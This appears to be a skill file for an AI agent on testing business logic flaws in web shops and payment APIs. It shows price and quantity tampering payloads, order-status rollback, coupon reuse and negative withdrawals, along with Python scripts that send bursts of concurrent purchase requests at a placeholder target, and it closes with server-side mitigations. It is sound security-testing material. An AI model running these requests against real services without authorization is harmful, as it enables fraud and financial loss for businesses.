---
name: business-logic-testing
description: Professional skills and methodology for business logic vulnerability testing
version: 1.0.0
---

# Business Logic Vulnerability Testing

## Overview

Business logic vulnerabilities are design flaws in application workflows that can lead to unauthorized operations, data tampering, or financial loss. This skill covers their detection, exploitation, and prevention.

## Vulnerability Types

### 1. Workflow Bypass

**Skip validation steps:**
- Access the final step directly
- Change the order of steps
- Repeat steps

### 2. Price Manipulation

**Negative prices:**
- Enter a negative amount
- Cause the account balance to increase

**Price tampering:**
- Modify the frontend price
- Modify the price in API requests

### 3. Quantity Limit Bypass

**Negative quantities:**
- Enter a negative number
- May increase inventory

**Exceeding limits:**
- Modify quantity limits
- Bypass through bulk operations

### 4. Race Conditions

**Concurrent requests:**
- Send multiple requests simultaneously
- Bypass per-operation limits

### 5. State Manipulation

**State rollback:**
- Change completed orders back to awaiting payment
- Modify order status

## Testing Methods

### 1. Workflow Analysis

**Identify business workflows:**
- Registration
- Purchasing
- Withdrawals
- Approval

**Test skipping steps:**
```
Normal flow: Step 1 → Step 2 → Step 3
Test: Access Step 3 directly
Test: Step 1 → Step 3 (skip Step 2)
```

### 2. Parameter Tampering

**Modify key parameters:**
```http
POST /api/purchase
{
  "product_id": 123,
  "quantity": 1,
  "price": 100.00  # Change to 0.01
}
```

**Negative value testing:**
```json
{
  "quantity": -1,
  "price": -100.00
}
```

### 3. Concurrency Testing

**Send simultaneous requests:**
```python
import threading
import requests

def purchase():
    requests.post('https://target.com/api/purchase', 
                  json={'product_id': 123, 'quantity': 1})

# Send 10 requests simultaneously
for i in range(10):
    threading.Thread(target=purchase).start()
```

### 4. State Modification

**Modify order status:**
```http
PATCH /api/order/123
{
  "status": "completed"  # Change to completed
}
```

**Roll back status:**
```http
PATCH /api/order/123
{
  "status": "pending"  # Revert from completed to awaiting payment
}
```

## Exploitation Techniques

### Price Manipulation

**Negative prices:**
```json
{
  "product_id": 123,
  "price": -100.00,
  "quantity": 1
}
```

**Modify the frontend price:**
```javascript
// Frontend code
const price = 100.00;

// Change to
const price = 0.01;
```

**Modify the API price:**
```http
POST /api/checkout
{
  "items": [
    {
      "product_id": 123,
      "price": 0.01,  # Original price: 100.00
      "quantity": 1
    }
  ]
}
```

### Quantity Limit Bypass

**Negative quantities:**
```json
{
  "product_id": 123,
  "quantity": -10  # May increase inventory
}
```

**Exceeding limits:**
```json
{
  "product_id": 123,
  "quantity": 999999  # Exceeds the per-purchase limit
}
```

### Coupon Abuse

**Reuse:**
```http
POST /api/checkout
{
  "coupon": "DISCOUNT50",
  "items": [...]
}

# Reuse the same coupon
```

**Inactive coupons:**
```http
POST /api/checkout
{
  "coupon": "EXPIRED_COUPON",  # Use an expired coupon
  "items": [...]
}
```

### Withdrawal Vulnerabilities

**Negative withdrawals:**
```json
{
  "amount": -1000.00  # May increase the account balance
}
```

**Exceeding the balance:**
```json
{
  "amount": 999999.00  # Exceeds the account balance
}
```

### Race Conditions

**Concurrent purchases:**
```python
import threading
import requests

def buy():
    requests.post('https://target.com/api/purchase',
                  json={'product_id': 123, 'quantity': 1})

# Concurrent requests during a flash sale
for i in range(100):
    threading.Thread(target=buy).start()
```

## Bypass Techniques

### Frontend Validation Bypass

**Call the API directly:**
- Bypass frontend JavaScript validation
- Send API requests directly

**Modify requests:**
- Intercept with Burp Suite
- Modify parameters and send

### Status Code Analysis

**Observe responses:**
- 200 OK - May have succeeded
- 400 Bad Request - Invalid parameters
- 403 Forbidden - Insufficient permissions
- 500 Internal Server Error - Server error

### Using Error Messages

**Extract information from errors:**
```
Error: "Insufficient funds. Current balance: 100.00"
→ Reveals the account balance
```

## Tools

### Burp Suite

**Use Repeater:**
1. Intercept a business request
2. Modify key parameters
3. Observe the response

**Use Intruder:**
1. Mark parameters
2. Use a payload list
3. Run batch tests

### Custom Scripts

```python
import requests
import json

def test_price_manipulation():
    # Test price modification
    for price in [0.01, -100, 0, 999999]:
        data = {
            "product_id": 123,
            "price": price,
            "quantity": 1
        }
        response = requests.post('https://target.com/api/purchase',
                                json=data)
        print(f"Price {price}: {response.status_code}")

test_price_manipulation()
```

## Verification and Reporting

### Verification Steps

1. Confirm that business logic restrictions can be bypassed
2. Verify that unauthorized operations can be performed
3. Assess impact (financial loss, data tampering, etc.)
4. Record the complete proof of concept
5. Record confirmed findings with `report_finding`, the platform's only entry point for findings. Include location, type, severity, reproduction steps/PoC, and remediation guidance

### Report Essentials

- Vulnerability location and affected workflow
- Unauthorized operations that can be performed
- Complete exploitation steps and PoC
- Remediation guidance (server-side validation, business rule checks, etc.)

## Mitigations

### Recommended Approach

1. **Server-side validation**
   ```python
   def process_purchase(product_id, quantity, price):
       # Retrieve the actual price from the database
       real_price = db.get_product_price(product_id)
       
       # Validate price
       if price != real_price:
           raise ValueError("Price mismatch")
       
       # Validate quantity
       if quantity <= 0:
           raise ValueError("Invalid quantity")
       
       # Process the purchase
       process_order(product_id, quantity, real_price)
   ```

2. **State machine validation**
   ```python
   class OrderState:
       PENDING = "pending"
       PAID = "paid"
       SHIPPED = "shipped"
       COMPLETED = "completed"
       
       TRANSITIONS = {
           PENDING: [PAID],
           PAID: [SHIPPED],
           SHIPPED: [COMPLETED]
       }
       
       def can_transition(self, from_state, to_state):
           return to_state in self.TRANSITIONS.get(from_state, [])
   ```

3. **Concurrency control**
   ```python
   import threading
   
   lock = threading.Lock()
   
   def process_order(order_id):
       with lock:
           # Check order status
           order = db.get_order(order_id)
           if order.status != 'pending':
               raise ValueError("Order already processed")
           
           # Process the order
           process(order)
   ```

4. **Business rule validation**
   ```python
   def validate_business_rules(order):
       # Validate quantity limits
       if order.quantity > MAX_QUANTITY:
           raise ValueError("Quantity exceeds limit")
       
       # Validate the price range
       if order.price <= 0:
           raise ValueError("Invalid price")
       
       # Validate inventory
       if order.quantity > get_stock(order.product_id):
           raise ValueError("Insufficient stock")
   ```

5. **Audit logs**
   ```python
   def log_business_action(user_id, action, details):
       log_entry = {
           "user_id": user_id,
           "action": action,
           "details": details,
           "timestamp": datetime.now()
       }
       db.log_action(log_entry)
   ```

## Considerations

- Test only in authorized environments
- Avoid affecting actual business operations
- Account for differences between workflows
- Maintain data consistency during testing